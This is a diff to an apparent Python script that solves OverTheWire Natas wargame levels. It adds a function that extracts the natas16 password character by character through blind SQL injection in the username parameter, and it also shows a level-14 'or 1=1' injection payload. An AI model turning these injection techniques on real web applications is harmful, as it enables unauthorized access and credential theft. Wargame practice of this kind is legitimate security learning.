@@ -34,6 +34,30 @@ def setMform(form, bundary) :
 	data += '--' + bundary + '--'
 	return data
 
+def bruteForce(url, auth, level, debug) :
+	c = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+	password = ''
+
+	for local in range(1, 33) :
+		found = False
+		if debug == 1 :
+			print 'local : ' + str(local) + ', char :',
+		for x in range(0, len(c)-1) :
+			target = url
+			target += '?username=natas' + str(level + 1) + '"'
+			target += ' AND SUBSTRING(password,' + str(local) + ',1)=BINARY "' + c[x]
+			r = requests.get(target, auth=auth)
+			if debug == 1 :
+				print c[x],
+			if 'exists' in r.text :
+				password += c[x]
+				if debug == 1 :
+					print '\nFound : ' + password
+				found = True
+			if found == True :
+				break
+	return password
+
 def getPassword(auth, level) :
 	url = 'http://natas' + str(level) + '.natas.labs.overthewire.org/'
 	method = 'GET'
@@ -141,6 +165,8 @@ def getPassword(auth, level) :
 		pattern = r'(\w+)'
 	elif level == 14 :
 		url += '?username=1" or 1=1 %23&password=1'
+	elif level == 15 :
+		return bruteForce(url, auth, level, 0)
 	else :
 		return str(level + 1) + ' not work'
 	
